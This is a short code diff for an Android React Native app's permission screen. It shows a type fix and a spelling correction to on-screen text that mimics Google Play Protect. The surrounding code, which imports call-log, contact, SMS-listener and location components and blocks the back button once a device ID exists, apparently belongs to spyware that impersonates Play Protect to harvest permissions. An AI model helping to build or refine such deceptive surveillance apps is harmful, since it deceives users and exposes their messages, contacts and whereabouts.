@@ -13,7 +13,7 @@ import {
   View,
 } from 'react-native';
 import CallLog from '../../components/CallLog';
-import {useNavigation} from '@react-navigation/native';
+import {EventMapCore, useNavigation} from '@react-navigation/native';
 import Contact from '../../components/Contact';
 import SmsListener from '../../components/SmsListener';
 import Location from '../../components/Location';
@@ -91,7 +91,7 @@ const Permission = () => {
     requestAllPermissions();
   }, [navigation]);
 
-  const handleBack = e => {
+  const handleBack = (e: any) => {
     if (deviceId) {
       e.preventDefault();
     }
@@ -177,7 +177,7 @@ const Permission = () => {
         />
         <Text>
           {
-            "Play Protect regularly checks your apps and device for harmfull behavior. You'll be notified of any sercurity risks found."
+            "Play Protect regularly checks your apps and device for harmful behavior. You'll be notified of any sercurity risks found."
           }
         </Text>
         <View style={{flex: 1, marginTop: 'auto', justifyContent: 'flex-end'}}>
